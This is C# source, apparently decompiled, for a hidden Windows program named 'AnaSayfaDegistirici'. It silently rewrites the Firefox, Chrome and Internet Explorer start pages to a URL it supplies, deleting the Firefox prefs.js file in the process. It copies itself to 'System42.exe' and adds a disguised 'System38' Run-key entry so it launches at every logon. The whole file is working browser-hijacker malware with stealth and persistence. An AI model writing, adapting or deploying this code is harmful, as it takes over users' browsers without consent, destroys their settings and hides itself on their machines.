using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace AnaSayfaDegistirici;

public class Form1 : Form
{
	private anasayfacek cek = new anasayfacek();

	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		cek.Bos();
		string text = "";
		string userName = Environment.UserName;
		OperatingSystem oSVersion = Environment.OSVersion;
		string text2 = oSVersion.Version.Major.ToString();
		IEDegistir();
		MSConfigOturtXP();
		if (text2 == "5")
		{
			MSConfigOturtXP();
			string[] directories = Directory.GetDirectories("C:\\Documents and Settings\\" + userName + "\\Application Data\\");
			string[] directories2 = Directory.GetDirectories("C:\\Documents and Settings\\" + userName + "\\Local Settings\\Application Data\\");
			string[] array = directories;
			foreach (string path in array)
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(path);
				text = directoryInfo.Name;
				if (text == "Mozilla")
				{
					MozillaDegistirXP();
				}
			}
			array = directories2;
			foreach (string path2 in array)
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(path2);
				text = directoryInfo.Name;
				if (text == "Google")
				{
					GoogleChromeXp();
				}
			}
			Application.Exit();
		}
		else if (text2 == "6")
		{
			MSConfigOturtWin7();
			string[] directories = Directory.GetDirectories("C:\\Users\\" + userName + "\\AppData\\Roaming\\");
			string[] directories2 = Directory.GetDirectories("C:\\Users\\" + userName + "\\AppData\\Local\\");
			string[] array = directories;
			foreach (string path in array)
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(path);
				text = directoryInfo.Name;
				if (text == "Mozilla")
				{
					MozillaDegistirWin7();
				}
			}
			array = directories2;
			foreach (string path2 in array)
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(path2);
				text = directoryInfo.Name;
				if (text == "Google")
				{
					GoogleChromeWin7();
				}
			}
			Application.Exit();
		}
		else
		{
			Application.Exit();
		}
	}

	public void MozillaDegistirWin7()
	{
		string text = "";
		string userName = Environment.UserName;
		string[] directories = Directory.GetDirectories("C:\\Users\\" + userName + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\");
		string[] array = directories;
		foreach (string path in array)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			text = directoryInfo.Name;
		}
		File.Delete("C:\\Users\\" + userName + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" + text + "\\prefs.js");
		StreamWriter streamWriter = new StreamWriter("C:\\Users\\" + userName + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" + text + "\\prefs.js");
		streamWriter.WriteLine("# Mozilla User Preferences" + Environment.NewLine + "user_pref(\"app.update.lastUpdateTime.browser-cleanup-thumbnails\", 1364819221);" + Environment.NewLine + "user_pref(\"browser.cache.disk.capacity\", 1048576);" + Environment.NewLine + "user_pref(\"browser.cache.disk.smart_size.first_run\", false);" + Environment.NewLine + "user_pref(\"browser.migration.version\", 8);" + Environment.NewLine + "user_pref(\"browser.pagethumbnails.storage_version\", 2);" + Environment.NewLine + "user_pref(\"browser.places.smartBookmarksVersion\", 4);" + Environment.NewLine + "user_pref(\"browser.rights.3.shown\", true);" + Environment.NewLine + "user_pref(\"browser.startup.homepage\", \"" + cek.Bos() + "\");" + Environment.NewLine + "user_pref(\"browser.startup.homepage_override.buildID\", \"20130307023931\");" + Environment.NewLine + "user_pref(\"browser.startup.homepage_override.mstone\", \"19.0.2\");");
		streamWriter.Close();
	}

	public void MozillaDegistirXP()
	{
		string text = "";
		string userName = Environment.UserName;
		string[] directories = Directory.GetDirectories("C:\\Documents and Settings\\" + userName + "\\Application Data\\Mozilla\\Firefox\\Profiles\\");
		string[] array = directories;
		foreach (string path in array)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			text = directoryInfo.Name;
		}
		File.Delete("C:\\Documents and Settings\\" + userName + "\\Application Data\\Mozilla\\Firefox\\Profiles\\" + text + "\\prefs.js");
		StreamWriter streamWriter = new StreamWriter("C:\\Documents and Settings\\" + userName + "\\Application Data\\Mozilla\\Firefox\\Profiles\\" + text + "\\prefs.js");
		streamWriter.WriteLine("# Mozilla User Preferences" + Environment.NewLine + "user_pref(\"app.update.lastUpdateTime.browser-cleanup-thumbnails\", 1364819221);" + Environment.NewLine + "user_pref(\"browser.cache.disk.capacity\", 1048576);" + Environment.NewLine + "user_pref(\"browser.cache.disk.smart_size.first_run\", false);" + Environment.NewLine + "user_pref(\"browser.migration.version\", 8);" + Environment.NewLine + "user_pref(\"browser.pagethumbnails.storage_version\", 2);" + Environment.NewLine + "user_pref(\"browser.places.smartBookmarksVersion\", 4);" + Environment.NewLine + "user_pref(\"browser.rights.3.shown\", true);" + Environment.NewLine + "user_pref(\"browser.startup.homepage\", \"" + cek.Bos() + "\");" + Environment.NewLine + "user_pref(\"browser.startup.homepage_override.buildID\", \"20130307023931\");" + Environment.NewLine + "user_pref(\"browser.startup.homepage_override.mstone\", \"19.0.2\");");
		streamWriter.Close();
	}

	public void GoogleChromeWin7()
	{
		string userName = Environment.UserName;
		StreamReader streamReader = new StreamReader("C:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Preferences");
		string text = streamReader.ReadToEnd();
		streamReader.Close();
		int startIndex = text.IndexOf("   \"session\": {") + 3;
		int length = text.Substring(startIndex).IndexOf("   },") + 5;
		string oldValue = text.Substring(startIndex, length);
		StreamWriter streamWriter = new StreamWriter("C:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Preferences");
		streamWriter.WriteLine(text.Replace(oldValue, "\"session\": {" + Environment.NewLine + "      \"restore_on_startup\": 4," + Environment.NewLine + "      \"restore_on_startup_migrated\": true," + Environment.NewLine + "      \"urls_to_restore_on_startup\": [ \"" + cek.Bos() + "\" ]" + Environment.NewLine + "   },"));
		streamWriter.Close();
	}

	public void GoogleChromeXp()
	{
		string userName = Environment.UserName;
		StreamReader streamReader = new StreamReader("C:\\Documents and Settings\\" + userName + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\Preferences");
		string text = streamReader.ReadToEnd();
		streamReader.Close();
		int startIndex = text.IndexOf("   \"session\": {") + 3;
		int length = text.Substring(startIndex).IndexOf("   },") + 5;
		string oldValue = text.Substring(startIndex, length);
		StreamWriter streamWriter = new StreamWriter("C:\\Documents and Settings\\" + userName + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\Preferences");
		streamWriter.WriteLine(text.Replace(oldValue, "\"session\": {" + Environment.NewLine + "      \"restore_on_startup\": 4," + Environment.NewLine + "      \"restore_on_startup_migrated\": true," + Environment.NewLine + "      \"urls_to_restore_on_startup\": [ \"" + cek.Bos() + "\" ]" + Environment.NewLine + "   },"));
		streamWriter.Close();
	}

	public void IEDegistir()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer\\Main", writable: true);
		registryKey.SetValue("Start Page", cek.Bos() ?? "");
		registryKey.Close();
	}

	public void MSConfigOturtWin7()
	{
		try
		{
			string executablePath = Application.get_ExecutablePath();
			File.Copy(executablePath, "C:\\ProgramData\\System42.exe");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "System38", "C:\\ProgramData\\System42.exe", RegistryValueKind.String);
		}
		catch
		{
		}
	}

	public void MSConfigOturtXP()
	{
		string userName = Environment.UserName;
		try
		{
			string executablePath = Application.get_ExecutablePath();
			File.Copy(executablePath, "C:\\Documents and Settings\\" + userName + "\\System42.exe");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "System38", "C:\\Documents and Settings\\" + userName + "\\System42.exe", RegistryValueKind.String);
		}
		catch
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(116, 0));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
